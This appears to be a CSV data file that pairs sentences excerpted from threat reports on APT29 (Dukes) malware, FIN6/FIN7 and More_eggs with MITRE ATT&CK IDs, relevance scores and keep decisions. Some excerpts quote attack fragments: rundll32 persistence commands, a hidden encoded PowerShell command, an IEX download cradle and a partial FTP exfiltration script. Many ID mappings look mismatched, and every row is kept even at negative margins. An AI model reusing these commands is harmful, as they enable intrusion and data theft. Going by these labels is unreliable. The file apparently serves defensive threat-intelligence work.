"query","candidate","type","p_relevant","p_irrelevant","adj_score","margin","keep","decision"
"As seen in the screen shot above, the e-mail contained links pointing to the following URL: hxxp://efax.pfdregistry[.]net/eFax/37486.ZIP Inside of this password (6190) protected ZIP file a Microsoft Shortcut file named: 37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk Note that pfdregistry[.]net appears to be under the control of the attackers but may be a hijacked domain.","S0145","S","0.943481","0.056519","0.943481","0.886962","True","keep"
"39c2a7266132e0af016a48b97d565463d90 Notes: Alternate data stream (ADS) PNG file with the PowerDuke backdoor component hidden and encrypted within using Tiny Encryption Algorithm (TEA).","S0158","S","0.717521","0.282479","0.717521","0.435042","True","keep"
"Below are network indicators associated with command and control servers for the aforementioned Dukes attack campaigns. In July 2015, the Dukes started heavily targeting think tanks and NGOs. Most notably the Dukes have previously been tied to the breach of the Democratic National Committee (DNC) and intrusions into multiple high-profile United States Government organizations. The Dukes are known for launching their attacks by sending links to ZIP files, that contain malicious executables, hosted on legitimate compromised web servers. This appears to be consistent with several previous Dukes attack campaigns, such as those on August 25, 2016. Volexity believes that the Dukes are likely working to gain long-term access into think tanks and NGOs and will continue to launch new attacks for the foreseeable future.","T0848","T","0.970883","0.029117","0.970883","0.941766","True","keep"
"39c2a7266132e0af016a48b97d565463d90 Notes: Alternate data stream (ADS) PNG file with the PowerDuke backdoor component hidden and encrypted within using Tiny Encryption Algorithm (TEA). Notes: Alternate data stream (ADS) PNG file with the PowerDuke backdoor component hidden and encrypted within using Tiny Encryption Algorithm (TEA). ea095 Notes: Alternate data stream (ADS) PNG file with the PowerDuke backdoor component hidden and encrypted within using Tiny Encryption Algorithm (TEA).","S0031","S","0.975579","0.024421","0.975579","0.951158","True","keep"
"Notes: Alternate data stream (ADS) PNG file with the PowerDuke backdoor component hidden and encrypted within using Tiny Encryption Algorithm (TEA). ea095 Notes: Alternate data stream (ADS) PNG file with the PowerDuke backdoor component hidden and encrypted within using Tiny Encryption Algorithm (TEA).","T1027.003","T","0.94331","0.05669","0.94331","0.88662","True","keep"
"BLOG PowerDuke: Widespread Post-Election Spear Phishing Campaigns Targeting Think Tanks and NGOs NOVEMBER 9, 2016 by Steven Adair ??? ??? ???","S0387","S","0.884127","0.115873","0.884127","0.768254","True","keep"
"Follow us on Twitter: @Volexity, @stevenadair, @5ck, @imhlv2, @attrc APT, Dukes, elections, spear phishing Volexity has dubbed this backdoor PowerDuke .","S0145","S","0.944896","0.055104","0.944896","0.889792","True","keep"
"Similar attack campaigns using documents with macros dropping PowerDuke were further observed through October, where Universities, and not think tanks appear to have been the primary targets.","S1058","S","0.973709","0.026291","0.973709","0.947418","True","keep"
"Close the web browser Open the message0236.ZIP file in your secure email message.","T1471","T","0.936888","0.063112","0.936888","0.873776","True","keep"
"1395076 Notes: Primary PowerDuke backdoor (DLL) loader (leverages kxwn.lock:schemas) dropped to ""%APPDATA\Roaming\Microsoft\"" with persistence via HKCU Run Key ""WebCache"" (rundll32.exe %APPDATA\Roaming\Microsoft\kxwn.lock , #2).","S0393","S","0.830508","0.169492","0.830508","0.661016","True","keep"
"Please open the attachment election-headlines-FTE2016 in this email anc enter PIN CODE: 3209 SUBJECT:","S1024","S","0.944577","0.055423","0.944577","0.889154","True","keep"
"Document containing malicious macro that drops Filename: fywhx.dll File size: 10752 bytes MD5 hash: ad6723f61e10aefd9688b29b474a9323 SHA1 hash: dd766876b3be5022bfb062f454f878abfbc670b8 Notes: PowerDuke backdoor file dropped to ""%APPDATA\Roaming\HP\"" with persistence via HKCU Run Key ""ToolboxFX"" (rundll32.exe %APPDATA\Roaming\HP\fywhx.dll #2).","T1218.002","T","0.848813","0.151187","0.848813","0.697626","True","keep"
"SHA1 hash: ab32c09c46e0c9dbc576fefee68e5a2f57e0482e Notes: Alternate data stream (ADS) PNG file with the PowerDuke backdoor component hidden and encrypted within using Tiny Encryption Algorithm (TEA).","S0665","S","0.92707","0.07293","0.92707","0.85414","True","keep"
"Filename: RWP16-038_Norris.exe File size: 1144832 bytes MD5 hash: 3335f0461e5472803f4b19b706eaf4b5 SHA1 hash: 5cc807f80f14bc4a1d6036865e50d576200dfd2e Notes: Dropper for PowerDuke backdoor and clean decoy document Filename: gwV46iIc.idx File size: 10752 bytes MD5 hash: ae997d2047705 46a0c228f7b5d7052 ! an executable named: RWP16-038_Norris.exe Note that pfdresearch[.]org appears to be under the control of the attackers but may be a hijacked domain.","S0145","S","0.946725","0.053276","0.946725","0.893449","True","keep"
"Back to top TAGS Duke malware Forkmeiamfamous Threat Research Center Related Malware Resources T H R E AT R E S E A R C H December 20, 2024 Now You See Me, Now You Don't: Using LLMs to Obfuscate Malicious JavaScript Credential stealer Data Augmentation FraudGPT Seaduke Read now Symantec Trojan Next: APT Group UPS Targets US Government with Hacking Team Flash Exploit T H R E AT R E S E A R C H December 17, 2024 LDAP Enumeration: Unveiling the Double-Edged Sword of Active Directory Stately Taurus","S0023","S","0.866821","0.133179","0.866821","0.733642","True","keep"
"All network communications are performed over HTTP for this particular sample; however, it appears to support HTTPS as well.","S0070","S","0.967172","0.032828","0.967172","0.934344","True","keep"
"Main execution of malware Continuing along, we discover that this malware has the ability to persist using one of the following techniques: Persistence via PowerShell 1 2 Persistence via the Run registry key Persistence via a .lnk fi le stored in the Startup directory 3","T1547.014","T","0.941429","0.058571","0.941429","0.882858","True","keep"
"Obfuscation discovered in fi nal payload fi gure 4 Using a little brainpower and search/replace, we can begin identifying and renaming functionality within the malware.","T1027.009","T","0.819406","0.180594","0.819406","0.638812","True","keep"
"Additionally, Palo Alto Networks properly categorizes the URL used by Seaduke as malicious. Extracted Python fi les from Seaduke We can then use a tool such as uncompyle2 to convert the Python byte-code into the original source code. If the decrypted data does not produce proper JSON data, Seaduke will discard it and enter a sleep cycle.","S0142","S","0.954246","0.045754","0.954246","0.908492","True","keep"
"This program allows an individual to write a program using the Python scripting language and convert it into an executable for the Microsoft Windows, Linux, Mac OSX, Solaris, or AIX platform.","T1059","T","0.926857","0.073143","0.926857","0.853714","True","keep"
"Here are some of our observations: First Layer of Obfuscation Once the UPX packer is removed from the malware sample, it becomes quickly apparent that we're dealing with a sample compiled using PyInstaller .","S1164","S","0.926341","0.073659","0.926341","0.852682","True","keep"
"Win32.Seadask' by a number of anti-virus companies.","S0041","S","0.496278","0.503722","0.496278","-0.00744400000000001","True","keep"
"THREATS APT (Targeted attacks) Secure environment (IoT)","S1193","S","0.905534","0.094466","0.905534","0.811068","True","keep"
"* APT COZYDUKE SPYWARE The CozyDuke APT Your email address will not be published.","S0063","S","0.938929","0.061071","0.938929","0.877858","True","keep"
"Assembler 0x29A Micro Backdoor , Miniduke is back: Nemesis Gemina and the Botgen Studio Securelist, July 2014 , CrySyS, July 2014 MiniDuke 2 (CosmicDuke) , FCOSMICDUKE Cosmu with a twist of MiniDuke [pdf] Secure, September 2014 , Leviathan THE CASE OF THE MODIFIED BINARIES Security, October 2014 , Blaze's Security Blog, September A word on CosmicDuke 2014 , F-Secure, OnionDuke: APT Attacks Via the Tor Network November 2014","S0665","S","0.874525","0.125475","0.874525","0.74905","True","keep"
"Assembler 0x29A Micro Backdoor , Miniduke is back: Nemesis Gemina and the Botgen Studio Securelist, July 2014 , CrySyS, July 2014 MiniDuke 2 (CosmicDuke) , FCOSMICDUKE Cosmu with a twist of MiniDuke [pdf] Secure, September 2014 , Leviathan THE CASE OF THE MODIFIED BINARIES Security, October 2014 , Blaze's Security Blog, September A word on CosmicDuke 2014 , F-Secure, OnionDuke: APT Attacks Via the Tor Network November 2014 For more information about MiniDuke, CosmicDuke and OnionDuke, please see References.","S0023","S","0.866202","0.133799","0.866202","0.732403","True","keep"
"This seems to indicate the authors of OnionDuke and CozyDuke / Cozy Bear are the same, or working together.","S0226","S","0.939207","0.060793","0.939207","0.878414","True","keep"
"Below we compare Show.dll with the OnionDuke sample MD5: c8eb6040fd02d77660d19057a38 ! One of the second stage modules of CozyDuke/Cozy Bear, Show.dll, is particularly interesting because it appears to have been built onto the same platform as OnionDuke.","S0396","S","0.705902","0.294098","0.705902","0.411804","True","keep"
"One of the second stage modules of CozyDuke/Cozy Bear, Show.dll, is particularly interesting because it appears to have been built onto the same platform as OnionDuke. This seems to indicate the authors of OnionDuke and CozyDuke / Cozy Bear are the same, or working together.","S0664","S","0.964066","0.035934","0.964066","0.928132","True","keep"
"Communications with the CozyDuke C2 include key/value pairs passed as URL parameters. The Connections Between MiniDuke, CosmicDuke and OnionDuke , F-Secure, January 2015 Kaspersky Lab products detect the malware used by the CozyDuke threat actor as: The CozyDuke APT APT REPORTS 21 APR 2015 8 minute read ALA // AUTHORS KURT BAUMGARTNER COSTIN RAIU CozyDuke (aka CozyBear, CozyCar or 'O ! ice Monkeys dropper analysis CozyDuke droppers and spyware components often maintain fairly common characteristics, but these # les' functionality are modi # ed in slight ways depending on the team's needs.","S0665","S","0.944009","0.055991","0.944009","0.888018","True","keep"
"It then uses the runtime resolved networking API calls to send the collected data back to a hardcoded c2 and set of urls.","T0869","T","0.915802","0.084198","0.915802","0.831604","True","keep"
"The standard win32 api CryptDecrypt uses rc4 to decrypt this blob into a hardcoded c2, url path, and url parameters listed below with a simple 140-bit key 'x8BxFFx55x8BxECx83xECx50xA1x84x18x03x68x33xC9x6 6xF7x45x10xE8x1Fx89x45xFCx8Bx45x14x56'.","T0869","T","0.410805","0.589195","0.410805","-0.17839","True","keep"
"It maintains both code and data in the raw, encrypted blobs of data to be decrypted and used at runtime, and Subscribe to our weekly e-mails The hottest research right in your inbox Email(Required)","T1071.005","T","0.924602","0.075398","0.924602","0.849204","True","keep"
"Cache.dll code $ ow overview RC4 decrypt hardcoded c2 and urls resolve hidden function calls collect identifying victim system data encrypt collected data send stolen data to c2 and retrieve commands Cache.dll code details Structurally, 'Cache.dll'","S1105","S","0.953567","0.046433","0.953567","0.907134","True","keep"
"7.txt screenshot_task.dll is a 32-bit dll used to take a screenshot of the full desktop window and save it as a bitmap in %temp%.","T1113","T","0.337535","0.662465","0.337535","-0.32493","True","keep"
"The CozyDuke APT APT REPORTS 21 APR 2015 8 minute read ALA // AUTHORS KURT BAUMGARTNER COSTIN RAIU CozyDuke (aka CozyBear, CozyCar or 'O !","S0046","S","0.655804","0.344196","0.655804","0.311608","True","keep"
"It then launches player.exe, a CozyDuke dropper maintaining antidetection techniques: 3d3363598f87c78826c859077606e514,player.exe,338kb,Tr ojan.","S0137","S","0.646147","0.353853","0.646147","0.292294","True","keep"
"Win32.CozyDuke.a, CompiledOn:2014.07.02 21:13:26 4152e79e3dbde55dcf3fc2014700a022,6kb,racss.dat","S0046","S","0.216281","0.783719","0.216281","-0.567438","True","keep"
"Executable-Signing Certi "" cates Samples are usually signed with a fake certi # cate - we've seen two instances, one AMD and one Intel: FROM THE SAME AUTHORS Focus on DroxiDat/SystemBC","T1553.002","T","0.928672","0.071328","0.928672","0.857344","True","keep"
"Con "" guration "" les: Some of the malware uses an encrypted con # guration # le which is stored on disk as 'racss.dat'.","T1027.003","T","0.271526","0.728474","0.271526","-0.456948","True","keep"
"Here's how such a database # le appears: These are BASE64 encoded and use the same RC4 encryption key as the malware con # guration.","S1063","S","0.966016","0.033984","0.966016","0.932032","True","keep"
"Content menu Search... Subscribe The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A","S0051","S","0.363464","0.636536","0.363464","-0.273072","True","keep"
"ADOBE ADOBE PDF DATA ENCRYPTION MINIDUKE OBFUSCATION TARGETED ATTACKS VULNERABILITIES AND EXPLOITS The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor Content menu Search... Subscribe The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A [The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor.","S0023","S","0.909071","0.090929","0.909071","0.818142","True","keep"
"les were rigged with exploits attacking Adobe Reader versions 9, 10 and 11, bypassing its sandbox.","S0432","S","0.945657","0.054343","0.945657","0.891314","True","keep"
"Based on the analysis, it appears that the MiniDuke-s creators provide a dynamic backup system that also can # y under the radar - if Twitter isn-t working or the accounts are down, the malware can use Google Search to !","S0294","S","0.971215","0.028785","0.971215","0.94243","True","keep"
"le, make directory, kill process and of course, download and execute new malware and lateral movement tools.","S0051","S","0.972817","0.027183","0.972817","0.945634","True","keep"
"[The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor.","S0568","S","0.819207","0.180793","0.819207","0.638414","True","keep"
"ADOBE ADOBE PDF DATA ENCRYPTION MINIDUKE OBFUSCATION TARGETED ATTACKS VULNERABILITIES AND EXPLOITS The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor","S0187","S","0.94097","0.05903","0.94097","0.88194","True","keep"
"Coding My Way Out of Here: C2 in Browser Isolation Environments By Mandiant ??? 8-minute read Help Threat Intelligence Seeing Through a GLASSBRIDGE: Understanding the Digital Marketing Ecosystem Spreading Pro-PRC In ! uence Operations By Google Threat Intelligence Group ?? 13-minute read English","T1567.003","T","0.889476","0.110524","0.889476","0.778952","True","keep"
"Infrequent beaconing, use of DGA and compromised infrastructure for C2, and appended # le headers used to bypass content inspection made this backdoor di $ cult to identify using typical network monitoring techniques.","T0817","T","0.429002","0.570998","0.429002","-0.141996","True","keep"
"ICO GIF JPG PNG MP3 BMP The sample in this example used 11 legitimate domains owned by an organization located near the victim.","T1590.001","T","0.71255","0.28745","0.71255","0.4251","True","keep"
"The WindowsParentalControlsMigration consumer was con # gured to silently execute a base64-encoded PowerShell command. WindowsParentalControlsMigration CommandLineTemplate Figure 3 contains the decoded PowerShell command from the 'CommandLineTemplate.'","T1216.002","T","0.916841","0.083159","0.916841","0.833682","True","keep"
"WMI Filters de # ne conditions that will trigger a Consumer, including system sta % up, the execution of a program, the passing of a speci # ed time and many others.","T1546.003","T","0.729906","0.270094","0.729906","0.459812","True","keep"
"WMI permanent event subscriptions can be used to trigger actions when speci # ed conditions are met.","S0645","S","0.939175","0.060825","0.939175","0.87835","True","keep"
"WMI provides many administrative capabilities on local and remote systems, including querying system information, sta % ing and stopping processes, and se !","S0057","S","0.976612","0.023388","0.976612","0.953224","True","keep"
"As stealthy as POSHSPY can be, it comes to light quickly if you know where to look. Dunwoody Mandiant has observed APT29 using a stealthy backdoor that we call POSHSPY. POSHSPY leverages two of the tools the group frequently uses: PowerShell and Windows Management Instrumentation (WMI). POSHSPY makes the most of using built-in Windows features - so-called 'living o "" the land' - to make an especially stealthy backdoor. POSHSPY's use of WMI to both store and persist the backdoor code makes it nearly invisible to anyone not familiar with the intricacies of WMI. Threat Intelligence Dissecting One of APT29's Fileless WMI and PowerShell Backdoors (POSHSPY)","S0031","S","0.826848","0.173152","0.826848","0.653696","True","keep"
"The backdoor's infrequent beaconing, tra $ c obfuscation, extensive encryption and use of geographically local, legitimate websites for command and control (C2) make identi # cation of its network tra $ c di $ cult.","T1655.001","T","0.875317","0.124683","0.875317","0.750634","True","keep"
"Its use of a PowerShell payload means that only legitimate system processes are utilized and that the malicious code execution can only be identi # ed through enhanced logging or in memory.","T1564.010","T","0.96208","0.03792","0.96208","0.92416","True","keep"
"POSHSPY's use of WMI to both store and persist the backdoor code makes it nearly invisible to anyone not familiar with the intricacies of WMI. WMI provides many administrative capabilities on local and remote systems, including querying system information, sta % ing and stopping processes, and se ! We have observed APT29 use WMI to persist a backdoor and also store the PowerShell backdoor code.","T1546.003","T","0.835223","0.164777","0.835223","0.670446","True","keep"
"POSHSPY makes the most of using built-in Windows features - so-called 'living o "" the land' - to make an especially stealthy backdoor.","S0232","S","0.347337","0.652663","0.347337","-0.305326","True","keep"
"Its use of a PowerShell payload means that only legitimate system processes are utilized and that the malicious code execution can only be identi # ed through enhanced logging or in memory. POSHSPY leverages two of the tools the group frequently uses: PowerShell and Windows Management Instrumentation (WMI). The WindowsParentalControlsMigration consumer was con # gured to silently execute a base64-encoded PowerShell command.","T1202","T","0.941827","0.058173","0.941827","0.883654","True","keep"
"Dunwoody Mandiant has observed APT29 using a stealthy backdoor that we call POSHSPY. Threat Intelligence Dissecting One of APT29's Fileless WMI and PowerShell Backdoors (POSHSPY) We # rst discussed APT29's use of this backdoor as pa % of our 'No Easy Breach' talk. We have observed APT29 use WMI to persist a backdoor and also store the PowerShell backdoor code.","S0674","S","0.799106","0.200894","0.799106","0.598212","True","keep"
"They also appear to be moving away from their custom tooling, with no Sekur samples compiled since November 2017 and fewer samples appearing in live operations.","S0665","S","0.963388","0.036612","0.963388","0.926776","True","keep"
"PowerShell was also used heavily for the execution of commands and arbitrary script execution.","S0371","S","0.970647","0.029352","0.970647","0.941295","True","keep"
"By supporting malleable communication with the C&C server, it can help attackers blend malicious traffic as legitimate, by allowing them to transform and store data, interpret it backwards, and extract and recover that data from a transaction.","T0869","T","0.957372","0.042628","0.957372","0.914744","True","keep"
"Banks in countries such as Russia, the United Kingdom, the Netherlands, Spain, Romania, Belarus, Poland, Estonia, Bulgaria, Georgia, Moldova, Kyrgyzstan, Armenia, Taiwan and Malaysia have allegedly been targeted with spearphishing emails, luring victims into clicking malicious URLs and executing booby-trapped documents. The initial point of compromise found in our investigation involved the use of spear-phishing emails with malicious URLs and tainted documents rigged to download a Cobalt Strike beacon component. The spear-phishing emails sent to the financial institutions either end up with victims downloading a tampered document meant to download the Cobalt Strike beacon or to exploit several unpatched Remote Code Execution Vulnerabilities and deploy a backdoor.","T0865","T","0.907228","0.092772","0.907228","0.814456","True","keep"
"They were able to maintain a low network footprint and avoid suspicion by using selected single workstations as a hub for centralizing collected information and for communication with their command & control server, outside the regular working hours of the bank.","T0865","T","0.939375","0.060625","0.939375","0.87875","True","keep"
"A carefully executed network reconnaissance and lateral movement plan was unfolding during this time.","T1071.002","T","0.898137","0.101863","0.898137","0.796274","True","keep"
"The system belonged to the adversary and accessed the organization network through a VPN tunnel established by the Cobalt Strike beacon component, to contact the internal corporate network systems.","TA0104","T","0.95553","0.04447","0.95553","0.91106","True","keep"
"In this case, the victim used the Telnet/SSH client PuTTY to connect to the server, and the attackers recompiled the machine's SSH daemon with a backdoor so they could gain direct access.","T1566.001","T","0.801096","0.198904","0.801096","0.602192","True","keep"
"A powershell script (filename: screenshot__.ps1) is created to screenshot victim's desktop.","S0194","S","0.951707","0.048293","0.951707","0.903414","True","keep"
"The Loader VBScript The dropped VBE file is a loader script that drops, installs and executes a second layer VBScript payload in the victim's system.","S0177","S","0.964013","0.035987","0.964013","0.928026","True","keep"
"In short, having gained access, they will jump through the network until they !","S0665","S","0.927895","0.072105","0.927895","0.85579","True","keep"
"More_Eggs Network IOCs In addition to the C2 information provided, which can change, below are some network IOCs that can be used to detect More_Eggs beaconing out of the network:","T1071","T","0.962944","0.037056","0.962944","0.925888","True","keep"
"Web Decoded FTP upload PowerShell script [???] echo 7 echo 7 taskkill /im csrss_tc.exe /f taskkill /im","S0194","S","0.898306","0.101694","0.898306","0.796612","True","keep"
"Get-ChildItem -Path $PathEnum'/c$/Program Files' Get-ChildItem -Path $PathEnum'/c$/Program Files foreach($Directory in Get-ChildItem -Path $PathE foreach($SeachDir in $foldersArr) { Get-ChildItem -Path $PathEnum'/c$/Users/ } } } PowerShell reconnaissance script used to enumerate directories $Dir=""C:/Windows/Temp/"" #ftp server $ftp = ""ftp://<IP Address>/incoming/"" $user = ""<username>"" $pass = ""<password>"" $webclient = New-Object System. } Decoded FTP upload PowerShell script powershell -nop -exec bypass IEX (New-Object Net.","S0371","S","0.941353","0.058647","0.941353","0.882706","True","keep"
"Ib Ic start Ib Imin powershell exe =w hidden encodedcommand JABzADOAIgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAEOAZQBtAGSAcgBSAFMA AYQBtACgALABbAEMAbwBuAHYAZQBYAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADY QAcgBpAG4AZwAoACIASAAOAHMASQBBAEEAQQBBAEEAQQBBAEEAQQBLADEAVwBXA EBAQGBSACsATABYAC8AQwBEADUAVwBTAGEAQwBpAFgAdwBuAFoAbwBwAFUAcgBq4","S0371","S","0.307786","0.692214","0.307786","-0.384428","True","keep"
"According to SentinelOne, the threat actor used PowerShell to download and execute a TerraLoader that installed More_eggs. X-Force IRIS has observed ITG08 employ the same tactic whereby it used PowerShell and Windows Management Instrumentation (WMI) to download and execute TerraLoader, then install More_eggs on remote hosts.","T1202","T","0.964285","0.035715","0.964285","0.92857","True","keep"
"Mitigation Tips Effective network defense and threat intelligence rely on multiple factors, such as knowing the network's attack surface, understanding the threat actor's motivations and TTPs, and the skill and knowledge of the security team that enable it to identify malicious behavior.","T0884","T","0.978145","0.021855","0.978145","0.95629","True","keep"
"This loader attempted to masquerade as the Apache Bench application and notably contained metadata and project paths (.PDB), indicating that it may be attempting to masquerade as other applications as well, a rather typical behavior for malicious binaries.","S0177","S","0.959521","0.040479","0.959521","0.919042","True","keep"
"The RC4 key is then used to encrypt data, which is additionally basE91 encoded and sent back to the C&C. BasE91 is a method for encoding binary as ASCII characters.","T1132.001","T","0.243409","0.756591","0.243409","-0.513182","True","keep"
"Over time, they've optimized their tactics culminating in successful breaches of third-party providers such as Inbenta resulting in the theft of Ticketmaster customer data.","S0665","S","0.97526","0.02474","0.97526","0.95052","True","keep"
"Both Palo Alto Networks [ 3] and QuoScient [ 4] have previously described documents created with this kit. Documents from this kit have previously been discussed by Quoscient [ 4 ] . Notably, documents created with this builder use the CMSTP bypass as described in [ 2 ] .","T1071.002","T","0.92357","0.07643","0.92357","0.84714","True","keep"
"Following the RDP connection to systems, FIN6 used two di ff erent techniques to establish a foothold: First technique: FIN6 used PowerShell to execute an encoded command.","S0393","S","0.964607","0.035393","0.964607","0.929214","True","keep"
"In particular, during the reconnaissance phase they gathered information on systems running SQL instances, dumping schemas for multiple databases and SQL user accounts. They likely cracked these hashes outside of the target's network before using multiple sets of domain admin credentials in combination with remote command execution tools such as PsExec and Remote Command Executor (RemCom) throughout the rest of the lateral movement phase.","T1566.003","T","0.919464","0.080536","0.919464","0.838928","True","keep"
"Although Opera is not a fork of Chromium, the newest version has credentials with the same implementation under the path: \Opera Software\Opera Stable\Login Data Stolen Data Command and Control","T1552","T","0.956336","0.043664","0.956336","0.912672","True","keep"
"Figure 17: PowerShell Injected DLL Intelliform Data Stealing 280020h add OFFFEOOICb Btosd stosd Bub eax , loa eax It also contains the reAective DLL injection PowerShell code to inject an information stealing malware variant DLL which will be discussed further.","S0371","S","0.924747","0.075253","0.924747","0.849494","True","keep"
"In the case of these documents it is used to encode JavaScript functionality multiple times, likely in order to avoid common analysis techniques employed by traditional anti-virus software which only emulate JavaScript instructions for a limited amount of iterations.","T1598.002","T","0.975422","0.024578","0.975422","0.950844","True","keep"
"They target very specific industries, hospitality hotels and restaurants - being one of them, and are behind a string of high-profile breaches including Red Robin, Chili's, Arby's, Burgerville, Omni Hotels and Saks Fifth Avenue, among many others.","S0665","S","0.920677","0.079323","0.920677","0.841354","True","keep"
"But this attack, instead of activating hta files (mshta.exe) from within the link, executes obfuscated JavaScript code. By contrast, Morphisec's Moving Target Defensebased technology prevents the attack in its early stages, before any channel to the attacker is opened.","TA0041","T","0.928721","0.071279","0.928721","0.857442","True","keep"
"The latter PowerShell injects a shellcode into its own process using well-known CreateThread and VirtualAlloc techniques: Set-Stfictvoje Invcke(Snul] funcrion tncooing 88 SHELLCODE: The shellcode phase of this attack is unique and","S0371","S","0.966032","0.033968","0.966032","0.932064","True","keep"
"They also use AutoIT droppers, password-protected EXE ! They rely on a Gri "" on JS backdoor and Cobalt/Meterpreter, and in recent attacks, Powershell Empire. They thus continue to use e "" ective spearphishing campaigns in Subscribe to our weekly e-mails The hottest research right in your inbox Subscribe Email(Required) dent that they continue to create new personas for use in either targeting or recruiting under a 'new' brand, 'IPC'.","T0865","T","0.932161","0.067839","0.932161","0.864322","True","keep"
"Malicious Documents We have seen two types of documents sent to victims in these spear phishing campaigns.","T1071.002","T","0.910519","0.089481","0.910519","0.821038","True","keep"
"victim to the phishing lure, it would allow FIN7 to increase their foothold within a victim organization's network and potentially pivot to new areas.","T1114","T","0.888733","0.111267","0.888733","0.777466","True","keep"
"Before concluding operations for the day, the adversary would set their callback times to one hour, and change the mode of their communications to use A resource records (instead of TXT records).","S0029","S","0.914488","0.085512","0.914488","0.828976","True","keep"
"During execution, PowerShell would make iterative DNS TXT queries, which would return encrypted data to be concatenated and then executed in memory.","S0371","S","0.966284","0.033716","0.966284","0.932568","True","keep"
"The weaponized PowerShell script was built to load an embedded DLL using reflective injection.","S1024","S","0.95695","0.04305","0.95695","0.9139","True","keep"
"i "" cates in the past to sign their phishing documents, backdoors, and later stage tools.","S0665","S","0.826783","0.173217","0.826783","0.653566","True","keep"
"For example, in April 2017, FireEye blogged about FIN7's spear phishing emails that leveraged hidden sho % cut # les (LNK # les) to initiate the infection and VBScript functionality launched by mshta.exe to infect the victim.","T1137.003","T","0.862639","0.137361","0.862639","0.725278","True","keep"
"From there the adversary loads process injection tools or memory scrapers (commonly mimikatz) and pivots using tools like powersploit, RDP services, and PowerAdmin Exec.","TA0104","T","0.965467","0.034533","0.965467","0.930934","True","keep"
"Malicious email Dle The malicious email was sent to the victim via a Microsoft Outlook account with the subject 'ConCrmation Receive Document' with an Excel Cle called 'ConCrmation Receive Document.xls'.","T1566.001","T","0.876395","0.123605","0.876395","0.75279","True","keep"
"ALIVE This state fetches the C&C server, expecting to receive a command from the attackers.","TA0101","T","0.927398","0.072602","0.927398","0.854796","True","keep"
"In May 2017, they expanded their geographical range with hundreds of new attacks targeting several militaries, financial and energy businesses in Europe as well as the United States. They managed to target the victims before Microsoft issued a security update, and organizations rolled out the patch. They tried to deliver a new Trojan called OopsIE, via using a variant of the ThreeDollars delivery document. They use phishing emails to deliver weaponized Microsoft Excel documents, and most of their malware infect the target system with VisualBasic and PowerShell (.ps1) scripts. They were found to be using earlier unseen malware, that uses","T0865","T","0.92236","0.07764","0.92236","0.84472","True","keep"
"No attribution to any known adversary groups was provided, other than that the target radius was primarily in the Middle East and the adversary was also likely operating out of that region.","TA0041","T","0.750152","0.249848","0.750152","0.500304","True","keep"
"The backdoor uses HTTP for C2 communication, with a custom encoding and handshake mechanisms.","T0869","T","0.732847","0.267153","0.732847","0.465694","True","keep"
"Command Request Communication The backdoor contacts the C&C server in the following URL using a GET request: sarmsoftware[.]com/search/{identifier} The response to this request is hidden in the source code of following Flickr lookalike page: 9 Not secure sarmsoftware com /search/","TA0101","T","0.873199","0.126801","0.873199","0.746398","True","keep"
"These backdoor commands are meant to be executed through PowerShell or through the Windows CMD interpreter.","S0371","S","0.966689","0.033311","0.966689","0.933378","True","keep"
"They use spear-phishing attacks with a domain masquerading technique to make the links in their emails appear legitimate.","S0665","S","0.975881","0.024119","0.975881","0.951762","True","keep"
"However, this is a good indicator of the observed activity and may be leveraged to detect this specific sample through host-based indicator checking.","T1630.003","T","0.935874","0.064126","0.935874","0.871748","True","keep"
"Gaining a foothold in the network that had access to numerous components of the ICS while maintaining command and control to Internet locations, positioned it well for espionage.","T1037.003","T","0.964109","0.035891","0.964109","0.928218","True","keep"
"Threat to the Electric Grid Operations In ICS networks though, some of the most concerning issues are related to an adversary's ability to learn the physical process such as the engineering of the systems and their components in how they work together. When used, the adversary can select an arbitrary system service, direct it to refer to CRASHOVERRIDE, and ensure it is loaded on system boot.","S0029","S","0.96064","0.03936","0.96064","0.92128","True","keep"
"T1036: Masquerading On multiple occasions, SandWorm attempted to masquerade their activity through researching and emulating malware used by the Lazarus Group.","S0394","S","0.405183","0.594817","0.405183","-0.189634","True","keep"
"Using legitimate tools like PsExec will save the adversary time from writing their own tooling.","TA0041","T","0.960333","0.039667","0.960333","0.920666","True","keep"
